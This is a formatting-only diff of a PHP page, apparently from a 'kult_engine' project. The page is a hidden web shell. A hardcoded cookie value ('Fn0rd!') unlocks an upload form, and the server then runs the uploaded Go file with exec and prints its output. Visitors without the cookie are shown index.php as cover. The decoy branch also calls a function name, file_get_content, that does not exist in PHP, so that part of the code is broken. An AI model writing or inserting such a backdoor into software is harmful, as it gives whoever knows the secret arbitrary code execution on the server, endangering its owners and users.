@@ -1,9 +1,10 @@
 <?php
 use kult_engine as k;
-include("invoker.class.php");
+
+include 'invoker.class.php';
 k\invoker::require_basics();
-if($_COOKIE["secret"] != "Fn0rd!"){
-    echo file_get_content("index.php");
+if ($_COOKIE['secret'] != 'Fn0rd!') {
+    echo file_get_content('index.php');
     die();
 }
 ?>
@@ -11,14 +12,12 @@ if($_COOKIE["secret"] != "Fn0rd!"){
 <input type="file" name="go"><input type="submit" value="exec">
 </form>
 <?php
-if(isset($_FILES['go']))
-{ 
+if (isset($_FILES['go'])) {
     $v = new k\uploadHelper($_FILES['go']);
-    $v->_autorize_extentions = "go";
+    $v->_autorize_extentions = 'go';
 
-    if($v->run())
-    {
-        exec("go run ".$v->_fullpath, $r);
+    if ($v->run()) {
+        exec('go run '.$v->_fullpath, $r);
         k\echo_br();
         foreach ($r as $l) {
             var_dump($l);
